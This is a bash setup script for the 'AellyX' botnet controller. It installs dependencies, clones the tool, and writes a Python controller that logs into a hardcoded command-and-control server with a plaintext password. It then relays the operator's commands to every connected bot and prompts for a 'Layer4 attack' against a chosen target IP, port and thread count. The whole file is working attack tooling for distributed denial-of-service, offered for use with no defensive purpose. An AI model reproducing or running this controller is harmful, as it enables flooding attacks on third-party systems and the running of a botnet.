#!/bin/bash
# AellyX Controller Setup - Run bots from your VPS
# This sets up the CONTROLLER interface to command all connected bots

SERVER_URL="http://80.225.246.24:5261/"
PASS="#technoz833#"

echo "========================================"
echo "   AellyX Controller Setup"
echo "========================================"

# Install dependencies
echo "[1/3] Installing dependencies..."
sudo apt update -qq 2>/dev/null
sudo apt install python3-pip git -y -qq 2>/dev/null
pip3 install flask requests python-nmap --break-system-packages -q 2>/dev/null || pip3 install flask requests python-nmap -q

# Clone AellyX
echo "[2/3] Setting up AellyX..."
cd ~
rm -rf AellyX 2>/dev/null
git clone -q https://github.com/k4ran909/AellyX.git
cd AellyX

# Create controller script that auto-connects as HOST
echo "[3/3] Creating controller..."
cat > controller.py << 'EOF'
import sys
sys.path.insert(1, "./AellyX/")

from importlib import import_module
import requests
from time import sleep

SERVER_URL = "http://80.225.246.24:5261/"
PASSWORD = "#technoz833#"

print("=" * 60)
print("   AellyX CONTROLLER - Bot Command Center")
print("=" * 60)
print(f"Server: {SERVER_URL}")
print("")
print("All commands you type will be sent to ALL connected bots!")
print("=" * 60)
print("")

# Reset server
try:
    requests.post(SERVER_URL + "reset", data={"password": PASSWORD}, timeout=5)
    print("[+] Connected to C&C server as CONTROLLER")
except Exception as e:
    print(f"[-] Failed to connect: {e}")
    exit(1)

# Import console framework
from CLIF_Framework.framework import console

# Create console with server config as HOST (controller)
var = console()
var.user_argv = ["main.py"]
var.server = [True, True, SERVER_URL, PASSWORD, 1]  # [Enabled, IsHost=True, URL, Pass, CmdNum]

# Run main module
main = import_module("AellyX.main")
main.run()
EOF

echo ""
echo "========================================"
echo "   Controller Ready!"
echo "========================================"
echo ""
echo "Starting controller..."
echo "Type 'l4' to load Layer4 attack module"
echo "Then: ip <target>, port <port>, threads <num>, run"
echo ""

python3 controller.py
